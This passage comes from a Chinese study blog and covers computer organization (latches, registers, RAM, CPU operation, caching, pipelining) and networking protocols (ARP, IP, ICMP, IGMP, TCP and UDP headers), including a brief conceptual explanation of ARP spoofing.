<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1657875638393.png"></p>
<p>上述AND电路可以<strong>永久记录0</strong>，无论输入怎么改变都不会改变输出。</p>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1657875756599.png"></p>
<p>将<code>OR和AND结合起来</code>就可以设计出锁存器：<code>一个可以存储单bit的电路</code>。<br>其中：<strong>如果“设置”为1，“复位”为0，则输出为1</strong>；<strong>如果“复位”为1，则输出为0</strong>；<strong>如果二者都是0，则输出为最后放入的内容</strong>。</p>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1657876259565.png"></p>
<p>将输入线简化为一条，即可得到上图所示：“允许写入”为1，存储的值会<strong>以输入为准</strong>；“允许写入”为0,则<strong>输出为固定值</strong>，不会受到输入的影响。</p>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1657876419746.png"></p>
<p>再次进行抽象：将复杂的逻辑电路封装为一个box，只<strong>关注其功能</strong>，而不关心其实现，即可得到一个<code>可以存储单bit数据的锁存器</code>。</p>
<h2 id="寄存器"><a href="#寄存器" class="headerlink" title="寄存器"></a>寄存器</h2><blockquote>
<p>一个只可以存储单bit数据的锁存器是没有用的，但是将多个锁存器组合就可以存储多bit数据，组合后的锁存器叫做寄存器。</p>
</blockquote>
<h4 id="位宽"><a href="#位宽" class="headerlink" title="位宽"></a>位宽</h4><p>寄存器可以存储多少数据取决于其由多少锁存器组合，我们将其叫做<code>位宽</code>。现如今我们使用的个人笔记本多为64位位宽，也就是说寄存器有64个锁存器组合获得。</p>
<h4 id="组成原理"><a href="#组成原理" class="headerlink" title="组成原理"></a>组成原理</h4><blockquote>
<p>下面我们将介绍一下寄存器的<strong>组成原理</strong>与<strong>优化方案</strong></p>
</blockquote>
<p>一个简单的<strong>8位寄存器</strong>的组成如下：<br><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1657876901521.png"></p>
<p>如图所示，通过八个<strong>并列排放</strong>锁存器即可实现<strong>寄存器的功能</strong>：首先将所有的E置1用于数据存入，而后通过线连接D、Q端获取输入输出。</p>
<p><strong>但是</strong>，只是存储一个8bits数据就要17根线（E口只需要一条线即可），如果要存储更多位数据就需要更多的线，这显然不符合我们设计预期。<br>当然，解决方法也很简单：<code>矩阵</code>！</p>
<blockquote>
<p>优化方案：矩阵</p>
</blockquote>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1657877395972.png"></p>
<p>如图所示，锁存器不再并列排布，而是通过矩阵的方式进行。要启动某个寄存器就只需要打开对应的<strong>行线和列线</strong>即可。</p>
<p>我们来细看其<strong>实现原理</strong>：<br><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1657877547245.png"></p>
<p>通过一个<strong>AND门</strong>实现启动功能，只有当<strong>行线和列线都为1</strong>时才<strong>启动此锁存器</strong>。<br>而后通过<strong>一条</strong>允许写入线连接所有锁存器，<strong>一根</strong>数据传入线来传输数据，<strong>一根</strong>数据传出先来获取数据。<br>通过矩阵处理后，原本存储256bits数据需要513条线，而现在只需要35根线（3+32）</p>
<h4 id="多路复用器"><a href="#多路复用器" class="headerlink" title="多路复用器"></a>多路复用器</h4><blockquote>
<p>将地址转换为行和列，已确定正确的存储地址。</p>
</blockquote>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1657886583504.png"></p>
<p>如上图所示，即为多路复用器。其作用就是把给定的地址转换为具体的坐标，以定位到确定的锁存器。</p>
<p>此图看起来比较复杂，所以我们需要进一步抽象，得到更加直观的模型。抽象后的模型如下：</p>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1657886811513.png"></p>
<p>将256位内存看作一个整体，而后给出具体的判断条件即可。</p>
<h2 id="内存（RAM：随时存取存储器）"><a href="#内存（RAM：随时存取存储器）" class="headerlink" title="内存（RAM：随时存取存储器）"></a>内存（RAM：随时存取存储器）</h2><blockquote>
<p>上文讲到了256位的存储器，通过矩阵排列的锁存器得到。但是256位也太小了，为了扩大存储容量，就需要继续进行组合。下面我们具体进行介绍。</p>
</blockquote>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1657887419036.png"></p>
<p>将前面所抽象得到的256位存储器进行排列，并通过线将其连接即可构成一个新的存储空间。</p>
<blockquote>
<p>我们先来介绍一下使用的线：</p>
</blockquote>
<p>首先需要8位的<strong>地址线</strong>，用于定位到具体的锁存器；之后是<strong>允许写入线</strong>和<strong>允许读取线</strong>各1条，控制此存储器的读写性；最后是<strong>8条数据线</strong>，用于写入和读取数据。</p>
<blockquote>
<p>继续进行抽象</p>
</blockquote>
<p>由于上图过于复杂，虽然可以清晰的表示出数据的存储方式与位置，但是却不契合人类的思维方式，而人类更加适应的数据获取方式当然就是：<code>将内存地址从小到大标号，通过此标号来标明位置</code>。因此，一个整体的<strong>可寻址内存</strong>就出来了。</p>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1657887855297.png"></p>
<p>如图所示，不再考虑内部实现方式，而是将其转换为了符合人类思维方式的表示方法。</p>
<blockquote>
<p>继续扩展</p>
</blockquote>
<p>现代计算机的内存已经扩展到了MB、GB的方式，但是其实现方式大同小异：<strong>不断把内存打包到更大规模而后使用一个直观的模型表示即可</strong>。</p>
<p>当然，随着内存规模的不断扩大，需要的内存地址也要增加。原先的8位内存地址最多可以表达256个内存地址（<code>以字节为单位，因为前面8个并排的256存储器接收到的内存地址是一样的，所以内存地址的最大值就是矩阵中锁存器数目</code>）而要给更多的内存寻址，就需要更大的内存地址，现在比较通用的是32位和64位。</p>
<blockquote>
<p>补充知识：<a href="https://zhuanlan.zhihu.com/p/88202063#:~:text=RAM%E6%98%AF%20%E9%9A%8F%E6%9C%BA%E5%AD%98%E5%8F%96%E5%AD%98%E5%82%A8%E5%99%A8%20%EF%BC%88random%20access%20memory%EF%BC%89%EF%BC%8C%E6%98%AF%E8%AE%A1%E7%AE%97%E6%9C%BA,%E5%86%85%E9%83%A8%E5%AD%98%E5%82%A8%E5%99%A8%20%E4%B8%AD%E7%9A%84%E4%B8%80%E7%A7%8D%EF%BC%8C%E4%B9%9F%E6%98%AF%E5%85%B6%E4%B8%AD%E6%9C%80%E9%87%8D%E8%A6%81%E7%9A%84%EF%BC%8C%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%92%8C%E6%89%8B%E6%9C%BA%E4%B8%AD%E4%B8%80%E8%88%AC%E6%8A%8A%E5%85%B6%E5%8F%AB%E5%81%9A%20%EF%BC%88%E8%BF%90%E8%A1%8C%EF%BC%89%E5%86%85%E5%AD%98%20%EF%BC%8C%E5%AE%83%E7%9A%84%E9%80%9F%E5%BA%A6%E8%A6%81%E6%AF%94%E7%A1%AC%E7%9B%98%E5%BF%AB%E5%BE%97%E5%A4%9A%EF%BC%8C%E6%89%80%E4%BB%A5%E7%94%A8%E8%BF%90%E8%A1%8C%E7%A8%8B%E5%BA%8F%E5%9C%A8RAM%E4%B8%AD%EF%BC%8C%E8%80%8C%E5%AD%98%E6%94%BE%E8%BF%90%E8%A1%8C%E6%97%B6%E4%B8%8D%E7%94%A8%E7%9A%84%E6%95%B0%E6%8D%AE%E5%88%99%E5%9C%A8%E7%A1%AC%E7%9B%98%E4%B8%AD%EF%BC%8C%E4%BB%80%E4%B9%88%E6%97%B6%E5%80%99%E9%9C%80%E8%A6%81%E6%95%B0%E6%8D%AE%EF%BC%8C%E4%BE%BF%E6%8A%8A%E6%95%B0%E6%8D%AE%E4%BB%8E%E7%A1%AC%E7%9B%98%E4%B8%AD%E6%8B%BF%E5%88%B0%E5%86%85%E5%AD%98%EF%BC%8C%E4%BD%86%E5%90%8C%E6%97%B6RAM%E6%96%AD%E7%94%B5%E4%BC%9A%E4%B8%A2%E5%A4%B1%E6%95%B0%E6%8D%AE%EF%BC%8C%E6%89%80%E4%BB%A5%E6%88%91%E4%BB%AC%E7%94%B5%E8%84%91%E5%A6%82%E6%9E%9C%E6%96%AD%E7%94%B5%E4%BA%86%E5%B0%B1%E4%BC%9A%E4%B8%A2%E5%A4%B1%E5%8E%9F%E6%9D%A5%E6%AD%A3%E5%9C%A8%E8%BF%90%E8%A1%8C%E7%9A%84%E6%95%B0%E6%8D%AE%E3%80%82.%20%E6%89%80%E4%BB%A5%EF%BC%8C%E6%89%8B%E6%9C%BA%E4%B8%AD%E7%9A%84RAM%E5%92%8C%E7%94%B5%E8%84%91%E4%B8%AD%E7%9A%84RAM%E7%9A%84%E6%A6%82%E5%BF%B5%E6%98%AF%E7%9B%B8%E5%90%8C%E7%9A%84%EF%BC%8CRAM%E5%8D%B3%E5%86%85%E5%AD%98%E8%B6%8A%E5%A4%A7%EF%BC%8C%E8%83%BD%E5%90%8C%E6%97%B6%E5%9C%A8%E5%86%85%E5%AD%98%E4%B8%AD%E6%89%A7%E8%A1%8C%E7%9A%84%E7%A8%8B%E5%BA%8F%E5%B0%B1%E8%B6%8A%E5%A4%9A%EF%BC%8C%E6%80%A7%E8%83%BD%E4%B8%80%E8%88%AC%E6%98%AF%E8%B6%8A%E5%A5%BD%E7%9A%84%E3%80%82.">RAM和ROM的区别（转）</a></p>
</blockquote>
<blockquote>
<p>我的思考：</p>
</blockquote>
<p>通过对计算机内存的学习，我越发感到其中的精妙与博大精深。<br>从最底层的门电路出发，构造可以存储单bit的电路，之后组成锁存器。<br>之后通过对多个锁存器的不同排列得到可以存储多bit的存储器。这其中利用矩阵的方式，借助多路复用器寻址。<br>构成的多bit单元又可以继续进行组合得到可以存储更多数据的存储器。</p>
<p>如果单独查看每一个存储单元，会发生其结构很简单；难的是巧妙的抽象，由小及大、层层递进，每一层不需要关注底层的具体结构。<br>其实如果对计算机的基础知识进行学习，会发现这种分层思想无处不在，不仅仅是在这种硬件的排布封装上，操作系统的层次结构、计算机网络的层次结构等都有体现。</p>
<hr>
<h1 id="中央处理器"><a href="#中央处理器" class="headerlink" title="中央处理器"></a>中央处理器</h1><blockquote>
<p>CPU：central precessing unit</p>
<blockquote>
<p>前面我们学习了ALU、寄存器、RAM，现在要把这些进行组合，得到：计算机的心脏——CPU.</p>
</blockquote>
</blockquote>
<h2 id="CPU的功能"><a href="#CPU的功能" class="headerlink" title="CPU的功能"></a>CPU的功能</h2><p><code>执行程序</code>：指令和数据。<br>指令包括<strong>数据的运算</strong>、<strong>数据的读取</strong>等。</p>
<p>其中指令由操作码和地址组成，前者告知要执行什么操作、后者告知操作的数据来自哪里（寄存器或者内存）</p>
<h2 id="CPU的工作流程"><a href="#CPU的工作流程" class="headerlink" title="CPU的工作流程"></a>CPU的工作流程</h2><blockquote>
<p> 下面我们以一个简单的程序为例来介绍一下CPU的工作流程。</p>
<blockquote>
<p>将以功能为主线进行介绍，而不是一根根线具体怎么练（具体的连线会在笔记中介绍）</p>
</blockquote>
</blockquote>
<blockquote>
<p>先来看一下要是使用的指令</p>
</blockquote>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1657976429807.png" alt="enter description here"></p>
<p>一个有4个基础指令，需要记住其操作码和功能。</p>
<blockquote>
<p>下面给出CPU的基本结构（简化版）</p>
</blockquote>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1657976642520.png"></p>
<p>大概分为3个部分：<strong>寄存器</strong>、<strong>控制单元</strong>和<strong>算术逻辑单元</strong></p>
<ul>
<li>寄存器：用于存储数据，这里以8位寄存器为例。</li>
<li>控制单元：由指令寄存器和指令地址寄存器组成，其中指令寄存器存放当前指令，指令地址寄存器存储指令地址。</li>
<li>算术逻辑单元：即ALU，用于运算和逻辑处理。</li>
</ul>
<blockquote>
<p>接下来介绍一下cpu执行指令的三个阶段</p>
</blockquote>
<ol>
<li><p><code>取指令阶段</code>：指令地址寄存器中存储指令地址，会根据此地址找到对应的内存位置并将此位置存储的数据放到指令寄存器里。</p>
</li>
<li><p><code>指令解码阶段</code>：由控制单元解析指令寄存器里的指令，解析的方法是通过电路实现的，具体见下图。<br><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1657977186524.png"><br>通过将前4位数据传入逻辑门电路而后根据结果即可判断其指令。</p>
</li>
<li><p><code>指令执行阶段</code>：根据解码的结果进行指令的具体实现即可。我们下面使用到的指令大概分为以下3个类型<br>1）<strong>RAM到寄存器</strong>：如LOAD_A&#x3D;0010,就是将对应内存地址中的数据存储到寄存器A中。<br>2）<strong>寄存器到RAM</strong>：如STORE_A&#x3D;0100，就是将A寄存器里的数据放到对应内存空间。<br>3）<strong>寄存器到寄存器</strong>：如ADD&#x3D;1000，就是将两个寄存器中的数据进行相加。</p>
</li>
</ol>
<blockquote>
<p>指令解析过程中的注意事项</p>
</blockquote>
<p>指令解析是由CPU通过配置的检测电路来进行的，具体实现是将指令前4位数据传入所有的检测电路，而后输出为1的电路即为检测结果。</p>
<p><code>注：所谓解码并不是指让CPU知道这个指令的作用，而是会在解码电路之后通过线连接RAM和寄存器，通过控制这两个部分的允许写入和允许读取来进行具体功能的实现</code>。</p>
<blockquote>
<p>指令执行过程中的注意事项</p>
</blockquote>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1657977679993.png"></p>
<p>上图给出了指令执行过程的流程图，注意你标黄的线。</p>
<ol>
<li><p>首先会根据指令的解析结果将<strong>RAM的允许读取</strong>打开，而后通过<strong>指令寄存器</strong>中存储的<strong>后4位数据</strong>找到对应内存位置。</p>
</li>
<li><p>检查电路启用寄存器A的“<strong>允许写入线</strong>”，然后RAM通过<strong>data线</strong>将数据传入寄存器（<code>所以的寄存器都会接收到，但是只有允许写入的才会修改内容</code>）</p>
</li>
<li><p>指令执行完毕后可以<strong>关掉所有的线路</strong>。</p>
</li>
</ol>
<blockquote>
<p>时钟信号</p>
</blockquote>
<p>上文我们介绍了cpu执行指令的流程，我们将每一个流程的实现看作一个周期，而cpu执行指令的快慢可以根据1秒钟的周期数来看。所以CPU引入一个时钟信号，控制单元会使用这个信号推动CPU内部操作。</p>
<p>时钟信号的单位是赫兹，1赫兹表示1秒1个周期。</p>
<h2 id="高级CPU的设计"><a href="#高级CPU的设计" class="headerlink" title="高级CPU的设计"></a>高级CPU的设计</h2><blockquote>
<p>上文介绍了CPU的简单执行流程，其中涉及到了时钟信号，用于表示执行指令的快慢。随着技术的不断发展，时钟信号也在不断加快。下面我就介绍一下CPU为了实现高速、稳定运转而实现的高级设计吧。</p>
</blockquote>
<h4 id="指令数目的不断提升"><a href="#指令数目的不断提升" class="headerlink" title="指令数目的不断提升"></a>指令数目的不断提升</h4><p>我们前面介绍了4条基础指令，但是一个CPU中的指令不仅仅只有这4条。<br>第一个集成cpu就拥有46条指令，并且随着技术发展这个数目越来越多，到如今一个现代处理器往往有上千条指令。</p>
<p>指令的增多虽然可以实现更多功能，但是也带来了很多问题，包括：<strong>时钟信号的不断加快</strong>、<strong>RAM读取数据的延迟</strong>等。</p>
<h4 id="高速缓存"><a href="#高速缓存" class="headerlink" title="高速缓存"></a>高速缓存</h4><p>前面我们讲过，cpu通过总线与RAM进行交互以读取学习，但是即便是总线很短、信号传输很快，在每秒数10亿的指令面前很小的延迟也会带来大问题。</p>
<p>解决延迟的一个方法就是给CPU加一点RAM——<code>缓存</code>。</p>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1657980349357.png"></p>
<p>缓存不会很大，往往是以KB、MB为单位，而RAM都是GB为单位。</p>
<p><code>缓存的作用</code>就是在cpu从RAM取数据时不会只拿一个，而是<strong>拿一批</strong>。因为数据常常是顺序处理，所以缓存的机制可以提高cpu的执行效率，因为缓存与CPU很近，一个时钟周期就可以给数据。同时在存储数据时也不会直接存储到RAM，而是先<strong>存储在缓存里</strong>。</p>
<p>缓存中每一个存储空间会有一个标记：<code>脏位</code>，用于<strong>标记此空间内容是否被修改</strong>。当缓存满时要清空缓存，此时会先检查脏位，将有改动的数据线<strong>同步到RAM</strong>后再进行清除。</p>
<h4 id="指令流水线"><a href="#指令流水线" class="headerlink" title="指令流水线"></a>指令流水线</h4><p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1657980765656.png"></p>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1657980936161.png"></p>
<p>观察上述图片，比较其不同之处：指令的并行操作。在cpu执行指令时进行下一条指令的解码和下下条指令的读取。</p>
<blockquote>
<p>写在最后：本次计算机组成原理部分到此结束。主要对CPU和RAM进行了介绍，更多涉及到底层实现和功能流程，还有很多内容内容没有介绍。在笔记中会以连线的方式从另一个角度介绍计算机组成原理。</p>
</blockquote>
]]></content>
      <categories>
        <category>【-基础知识-】408专题</category>
        <category>计算机组成原理</category>
      </categories>
      <tags>
        <tag>计算机组成原理</tag>
      </tags>
  </entry>
  <entry>
    <title>从零开始的计网学习-网络层协议</title>
    <url>/2023/01/25/%E8%AE%A1%E7%BD%91%E5%AD%A6%E4%B9%A0--%E7%BD%91%E7%BB%9C%E5%B1%82%E7%9A%84%E5%8D%8F%E8%AE%AE/</url>
    <content><![CDATA[<h1 id="网络层协议"><a href="#网络层协议" class="headerlink" title="网络层协议"></a>网络层协议</h1><blockquote>
<p>网络层协议，OSI参考模型的第三层。它控制通信子网进行工作，提供建立、保持和释放连接的手段，保证传输层实体之间进行透明的数据传输。</p>
</blockquote>
<blockquote>
<p>网络层有四个协议：<code>ARP协议</code>，<code>IP协议</code>，<code>ICMP协议</code>，<code>IGMP协议</code>。ARP协议为IP协议提供服务，IP协议为ICMP协议提供服务，ICMP协议为IGMP协议提供服务。</p>
</blockquote>
<h2 id="ARP协议"><a href="#ARP协议" class="headerlink" title="ARP协议"></a>ARP协议</h2><blockquote>
<p><strong>地址解析协议</strong>，即ARP（<strong>Address Resolution Protocol</strong>），是根据IP地址获取物理地址的一个TCP&#x2F;IP协议。</p>
<blockquote>
<p>物理地址也叫MAC地址，是一个直接烧录在网卡上的数据，也是一个不变的真实地址。</p>
</blockquote>
</blockquote>
<p>主机发送信息时将包含目标IP地址的ARP请求广播到局域网络上的<strong>所有主机</strong>，并接收返回消息，以此确定目标的物理地址；收到返回消息后将该IP地址和物理地址存入本机ARP缓存中并保留一定时间，下次请求时直接查询ARP缓存以节约资源。</p>
<p>每一个主机都有一个<code>ARP高速缓存</code>，此缓存中记录了最近一段时间内其它<code>IP地址与其MAC地址的对应关系</code>。如果本机想与某台主机通信，则首先在ARP高速缓存中查找此台主机的IP和MAC信息，如果存在，则直接利用此MAC地址构造以太帧；如果不存在，则向本网络上每一个主机<strong>广播一个ARP请求报文</strong>，其意义是”如果你有此IP地址，请告诉我你的MAC地址”，目的主机收到此请求包后，发送一个ARP响应报文，本机收到此响应后，把相关信息记录在ARP高速缓存中，以下的步骤同上。</p>
<img src="http://image-blog-danggeovo.oss-cn-beijing.aliyuncs.com//imageimage-20231109100813247.png" alt="image-20231109100813247" style="zoom:50%;" />

<p><img src="http://image-blog-danggeovo.oss-cn-beijing.aliyuncs.com//imageimage-20231109100832839.png" alt="image-20231109100832839"></p>
<h3 id="arp协议的缺点–arp欺骗"><a href="#arp协议的缺点–arp欺骗" class="headerlink" title="arp协议的缺点–arp欺骗"></a>arp协议的缺点–arp欺骗</h3><p>可以看出，ARP协议是有缺点的，第三方主机可以构造一个ARP欺骗报文，而源主机却无法分辨真假。如果发送者硬件地址字段填入攻击者的硬件地址，而发送者IP地址填入被假冒者的IP地址，那么就构造出了一个用于欺骗的ARP请求报文。那么被欺骗主机的ARP高速缓存，被假冒者的IP地址与其MAC地址的对应关系就会更改为欺骗者的，从而达到<strong>ARP欺骗</strong>的目的。特别的，如果攻击者冒充网关，将转发子网内到外网的所有通信量，以达到捕获其他主机的通信量，从而破坏数据传输的保密性。</p>
<h2 id="IP协议"><a href="#IP协议" class="headerlink" title="IP协议"></a>IP协议</h2><blockquote>
<p>IP是<strong>Internet Protocol</strong>（网际互连协议）的缩写,是TCP&#x2F;IP体系中的网络层协议。</p>
</blockquote>
<p>设计IP的目的是提高网络的可扩展性：<strong>一是解决互联网问题，实现大规模、异构网络的互联互通</strong>；<strong>二是分割顶层网络应用和底层网络技术之间的耦合关系，以利于两者的独立发展</strong>。根据端到端的设计原则，IP只为主机提供一种无连接、不可靠的、尽力而为的数据包传输服务。</p>
<p>作用的范围不同也是IP协议和ARP协议的区别，一般ARP协议只可以作用在一个子网之中；而IP协议是可以作用在不同网络之间的。</p>
<h2 id="ICMP协议"><a href="#ICMP协议" class="headerlink" title="ICMP协议"></a>ICMP协议</h2><blockquote>
<p>ICMP（Internet Control Message Protocol）,全称为Internet控制报文协议。</p>
</blockquote>
<p>它是TCP&#x2F;IP协议簇的一个<strong>子协议</strong>，用于在IP主机、路由器之间传递控制消息。控制消息是指<strong>网络通不通</strong>、<strong>主机是否可达</strong>、<strong>路由是否可用</strong>等网络本身的消息。这些控制消息虽然并不传输用户数据，但是对于用户数据的传递起着重要的作用。</p>
<p>ICMP使用IP的基本支持，就像它是一个更高级别的协议，但是，ICMP实际上是IP的一个组成部分，必须由每个IP模块实现。</p>
<blockquote>
<p>以前的关于ICMP协议的具体描述：<a href="https://qidangge.github.io/2021/10/24/%E4%BD%9C%E4%B8%9A2.2%20ping%E6%93%8D%E4%BD%9C%E4%B8%8Eicmp/">https://qidangge.github.io/2021/10/24/%E4%BD%9C%E4%B8%9A2.2%20ping%E6%93%8D%E4%BD%9C%E4%B8%8Eicmp</a>&#x2F;</p>
</blockquote>
<h2 id="IGMP协议"><a href="#IGMP协议" class="headerlink" title="IGMP协议"></a>IGMP协议</h2><blockquote>
<p>互联网组管理协议（IGMP，Internet Group Management Protocol）是因特网协议家族中的一个<strong>组播</strong>协议。</p>
</blockquote>
<p>TCP&#x2F;IP协议族的一个子协议，用于IP主机向任一个直接相邻的路由器报告他们的组成员情况。允许Internet主机参加多播，也是IP主机用作向相邻多目路由器报告多目组成员的协议。多目路由器是支持组播的路由器，向本地网络发送IGMP查询。主机通过发送IGMP报告来应答查询。组播路由器负责将组播包转发到所有网络中组播成员。　</p>
<p>互联网组管理协议（IGMP）是对应于开源系统互联（OSI）七层框架模型中网络层的协议。在互联网工程任务组（The Internet Engineering Task Force，简称IETF）编写的标准文档（RFC）2236.中对Internet组管理协议（IGMP）做了详尽的描述。附上链接：<a href="https://datatracker.ietf.org/doc/html/rfc2236">https://datatracker.ietf.org/doc/html/rfc2236</a></p>
]]></content>
      <categories>
        <category>【-基础知识-】408专题</category>
        <category>计算机网络</category>
      </categories>
      <tags>
        <tag>计算机网络</tag>
      </tags>
  </entry>
  <entry>
    <title>从零开始的计网学习——常见协议汇总</title>
    <url>/2023/01/15/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E2%80%94%E2%80%94%E5%B8%B8%E8%A7%81%E5%8D%8F%E8%AE%AE%E6%B1%87%E6%80%BB/</url>
    <content><![CDATA[<h1 id="TCP、UDP协议"><a href="#TCP、UDP协议" class="headerlink" title="TCP、UDP协议"></a>TCP、UDP协议</h1><h2 id="协议介绍"><a href="#协议介绍" class="headerlink" title="协议介绍"></a>协议介绍</h2><blockquote>
<p>TCP协议介绍</p>
</blockquote>
<p>TCP是一种面向连接（连接导向）的、可靠的基于字节流的传输层通信协议。TCP将用户数据打包成报文段，发送后会启动一个定时器，然后另一端收到的数据进行确认、对失序的数据重新排序、丢弃重复数据。</p>
<blockquote>
<p>UDP协议介绍</p>
</blockquote>
<p>UDP（User Datagram Protocol），用户数据报协议，是 OSI（Open System Interconnection，开放式系统互联） 参考模型中一种无连接的传输层协议，提供面向事务的简单不可靠信息传送服务。</p>
<blockquote>
<p>二者对比：</p>
</blockquote>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1655391893609.png"></p>
<h2 id="TCP协议分析"><a href="#TCP协议分析" class="headerlink" title="TCP协议分析"></a>TCP协议分析</h2><p><strong>先来看一下TCP头部格式：</strong></p>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1655391976516.png"></p>
<p><strong>下面我们来进行具体的字段介绍：</strong><br>一共<strong>20个字节</strong>，4个字节（32位）为一层，共5层。下面我们分层来介绍，为了方面记忆。</p>
<p>第一层：————-</p>
<ul>
<li>源端口( 16 位)：通信发送方使用的端口号</li>
<li>目标端口( 16 位)：通信接收方使用的端口号</li>
</ul>
<p>第二层：————-</p>
<ul>
<li>序列号( 32 位)：用来确保数据可靠传输的唯一值</li>
</ul>
<p>第三层：————-</p>
<ul>
<li>确认号( 32 位)：接收方在响应时发送的数值，是对接收到的数据的确认。</li>
</ul>
<p>第四层：————-</p>
<ul>
<li>数据偏移( 4 位)：标志数据包开始的位置，TCP 头部的长度 </li>
<li>SYN：(同步)发起连接的数据包：同步 SYN&#x3D;1 表示这是一个连接请求或连接接受报文。 </li>
<li>ACK：(确认)确认收到的数据包：只有当 ACK&#x3D;1 时，确认号字段才有效；当 ACK&#x3D;0 时，确认号无效。 </li>
<li>RST：(重置)之前尝试的连接被关闭，(信号差，信号拥挤)：当 RST&#x3D;1 时，表明 TCP 连接中出现严重差错（如由于主机崩溃或其他原因），必须释放连接，然后再重新建立运输连接。 </li>
<li>FIN：(结束)连接成功，传输完毕之后，连接正在断开：用来释放一个连接，FIN&#x3D;1 表明此报文段的发送端的数据已发送完毕，并要求释放运输连接。 </li>
<li>PSH：(推送)数据包直接发送给应用，而不是缓存起来：接收 TCP 收到 PSH&#x3D;1 的报文段，就尽快地交付接收应用进程，而不再等到整个缓存都填满了后再向上交付。</li>
<li>URG：(紧急)数据包中承载的内容应该立即由 TCP 协议栈立即进行处理：当 URG&#x3D;1 时，表明紧急指针字段有效。它告诉系统此报文段中有紧急数据，应尽快传送(相当于高优先级的数据)。</li>
<li>窗口大小( 16 位)：匹配缓存区的大小<br><strong>注</strong>：SYN、ACK、RST、FIN、PSH、 URG为标记字段(各占1位存储空间)</li>
</ul>
<p>第五层：————-</p>
<ul>
<li>校验和( 16 位)：确认 TCP 数据段中的内容是否发送了变化</li>
<li>紧急指针( 16 位)：明确显示数据之前的 16 进制序列号</li>
</ul>
<hr>
<p>以下在某TCP报文在wireshark协议解码窗口中的解析情况：</p>
<p> <img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1655392427589.png"></p>
<p>其中flags部分展开如下：</p>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1655392445946.png"></p>
<hr>
<h2 id="UDP协议分析"><a href="#UDP协议分析" class="headerlink" title="UDP协议分析"></a>UDP协议分析</h2><p><strong>先来看一下TCP头部格式：</strong></p>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1655392584611.png"><br>与TCP协议相比这个协议的头部就很简单了，当然这也和它们各自的用途有关。</p>
<p><strong>下面我们来进行具体的字段介绍：</strong><br>一共8个字节，分为4个部分。<br>dd</p>
<ul>
<li>源端口： 源端口号，需要对方回信时选用，不需要时全部置 0 ；</li>
<li>目的端口：目的端口号，在终点交付报文的时候需要用到；</li>
<li>长度：UDP 的数据报的长度（包括首部和数据）其最小值为 8（只有首部）。字段记录了该 UDP 数据包的总长度（以字节为单位），包括 8 字节的 UDP 头和其后的数据部分。最小值是 8（报文头的长度），最大值为 65535 字节；</li>
<li>校验和：检测 UDP 数据报在传输中是否有错，有错则丢弃。它的值是通过计算 UDP 数据报及一个伪包头而得到的。校验和的计算方法与通用的一样，都是累加求和。</li>
</ul>
<p><strong>注</strong>：端口是用来指明数据的来源（应用程序）以及数据发往的目的地（同样是应用程序）。字段包含了 16 比特的 UDP 协议端口号，它使得多个应用程序可以多路复用同一个传输层协议及 UDP 协议，仅通过端口号来区分不同的应用程序。</p>
<h1 id="IP协议"><a href="#IP协议" class="headerlink" title="IP协议"></a>IP协议</h1><h2 id="IP协议介绍"><a href="#IP协议介绍" class="headerlink" title="IP协议介绍"></a>IP协议介绍</h2><p>一个IP数据报包括“报头”和“数据”这两个组成部分，其中：</p>
<ul>
<li><strong>数据部分</strong>就是来自传输层的完整数据段；</li>
<li><strong>报头部分</strong>是为了正确传输数据报而增加的网络层IPv4协议信息，主要是源和目的网络的IP地址及控制信息。</li>
</ul>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1655790896925.png"></p>
